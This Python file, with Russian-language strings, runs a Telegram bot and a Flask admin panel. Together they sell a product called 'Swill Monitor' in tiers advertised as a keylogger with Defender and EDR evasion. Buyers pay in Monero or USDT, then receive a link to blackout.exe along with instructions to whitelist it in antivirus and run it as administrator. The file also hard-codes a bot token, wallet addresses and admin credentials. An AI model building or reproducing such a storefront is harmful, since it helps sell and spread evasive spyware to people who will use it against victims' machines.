import logging
import time
import requests
import sqlite3
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ===== КОНФИГИ =====
TOKEN = "8984654579:AAGaUlKtAjJd7wqR5BsaLEBMUeGKmztC-pM"
MONERO_ADDRESS = "46r6fC7DptBgov3ZQPtdzJ8Ge8o1fDiqe8UPPm1BxDLC4iHrFwn32PUWTXz3qH8jdaRMzuXG3obCdEbNncoJfMDHRMQ4N91"
USDT_ADDRESS = "TEmyv3w1CjftMMbF4qxEffV8P2P3D9m8xa"
FILE_URL = "https://tmpfiles.org/wRwDSeA58F4E/blackout.exe"
ADMIN_USER = "admin"
ADMIN_PASS = "swill2026"

# ===== БАЗА ДАННЫХ =====
def init_db():
    conn = sqlite3.connect('orders.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        plan TEXT,
        address TEXT,
        amount REAL,
        paid INTEGER DEFAULT 0,
        file_url TEXT,
        created_at TEXT
    )''')
    conn.commit()
    conn.close()

def add_order(user_id, plan, address, amount):
    conn = sqlite3.connect('orders.db')
    c = conn.cursor()
    c.execute("INSERT INTO orders (user_id, plan, address, amount, created_at) VALUES (?, ?, ?, ?, ?)",
              (user_id, plan, address, amount, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_all_orders():
    conn = sqlite3.connect('orders.db')
    c = conn.cursor()
    c.execute("SELECT * FROM orders ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()
    return rows

def mark_paid(order_id, file_url):
    conn = sqlite3.connect('orders.db')
    c = conn.cursor()
    c.execute("UPDATE orders SET paid=1, file_url=? WHERE id=?", (file_url, order_id))
    conn.commit()
    conn.close()

# ===== ПРОВЕРКА ПЛАТЕЖЕЙ =====
def check_monero(amount_usd):
    try:
        url = f"https://xmrchain.net/api/transactions?address={MONERO_ADDRESS}"
        r = requests.get(url, timeout=10)
        data = r.json()
        total_xmr = 0
        for tx in data.get("data", {}).get("transactions", []):
            if tx.get("direction") == "in":
                total_xmr += tx.get("amount", 0) / 1e12
        return total_xmr * 140 >= amount_usd
    except:
        return False

def check_usdt(amount_usd):
    try:
        url = f"https://api.trongrid.io/v1/accounts/{USDT_ADDRESS}/transactions/trc20?limit=50"
        r = requests.get(url, timeout=10)
        data = r.json()
        total_usdt = 0
        for tx in data.get("data", []):
            if tx.get("type") == "Transfer" and tx.get("to") == USDT_ADDRESS:
                total_usdt += int(tx.get("value", 0)) / 1e6
        return total_usdt >= amount_usd
    except:
        return False

# ===== TELEGRAM БОТ =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Купить Lite — $99", callback_data="buy_lite")],
        [InlineKeyboardButton("Купить Pro — $299", callback_data="buy_pro")],
        [InlineKeyboardButton("Купить Enterprise — $999", callback_data="buy_enterprise")],
        [InlineKeyboardButton("🌐 Сайт", callback_data="site")],
        [InlineKeyboardButton("📖 Инструкция", callback_data="instructions")],
        [InlineKeyboardButton("🛠 Поддержка", callback_data="support")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("👋 Добро пожаловать в Swill Monitor!", reply_markup=reply_markup)

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "site":
        await query.edit_message_text("🌐 Сайт: https://RTYT232.github.io/portfolio/")

    elif data.startswith("buy_"):
        plan = data.replace("buy_", "")
        if plan == "lite":
            amount, desc = 99, "До 5 устройств, базовый логгер"
        elif plan == "pro":
            amount, desc = 299, "До 20 устройств, обход Defender"
        elif plan == "enterprise":
            amount, desc = 999, "Безлимит, обход EDR, кастом"
        else:
            await query.edit_message_text("❌ Неизвестный тариф.")
            return

        add_order(user_id, plan, MONERO_ADDRESS, amount)
        await query.edit_message_text(
            f"💰 {plan.upper()} — ${amount}\n{desc}\n\n"
            f"💳 Оплата:\nMonero:\n`{MONERO_ADDRESS}`\n\nUSDT:\n`{USDT_ADDRESS}`\n\n"
            f"После оплаты напишите /confirm"
        )

    elif data == "instructions":
        await query.edit_message_text("📖 Скачайте .exe → добавьте в исключения → запустите от администратора.")

    elif data == "support":
        await query.edit_message_text("🛠 Напишите вопрос — отвечу вручную.")

    else:
        await query.edit_message_text("❌ Неизвестная команда.")

async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⏳ Проверяю платежи...")
    if check_monero(50) or check_usdt(50):
        await update.message.reply_text(f"✅ Платёж подтверждён!\nСсылка: {FILE_URL}")
    else:
        await update.message.reply_text("❌ Платёж не найден. Попробуйте позже.")

def run_bot():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("confirm", confirm))
    app.add_handler(CallbackQueryHandler(button))
    print("✅ Бот запущен!")
    app.run_polling()

# ===== FLASK АДМИНКА =====
app = Flask(__name__)
app.secret_key = "supersecretkey"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['username'] == ADMIN_USER and request.form['password'] == ADMIN_PASS:
            session['logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        return "Неверный логин или пароль"
    return render_template('login.html')

@app.route('/admin')
def admin_dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    orders = get_all_orders()
    return render_template('admin.html', orders=orders)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# ===== ЗАПУСК ВСЕГО =====
if __name__ == "__main__":
    init_db()
    import threading
    threading.Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=5000)
